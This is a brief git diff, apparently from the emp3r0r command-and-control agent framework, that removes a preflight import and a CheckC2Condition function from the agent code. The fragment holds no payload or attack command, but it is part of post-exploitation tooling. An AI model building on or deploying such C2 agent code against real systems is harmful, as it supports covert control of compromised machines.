@@ -19,7 +19,6 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/agentutils"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
-	"github.com/jm33-m0/emp3r0r/core/lib/preflight"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
@@ -89,16 +88,6 @@ func ReportStatus(config *def.Config, info *def.Emp3r0rAgent) (err error) {
 	return nil
 }
 
-// CheckC2Condition check preflight
-func CheckC2Condition(proxy string) bool {
-	// If Preflight not enabled, return true (Pass)
-	if !common.RuntimeConfig.PreflightEnabled {
-		return true
-	}
-
-	// Use Preflight Client
-	return preflight.Check(common.RuntimeConfig)
-}
 
 func catchInterruptAndExit(ctx context.Context, cancel context.CancelFunc) {
 	sig := make(chan os.Signal, 1)
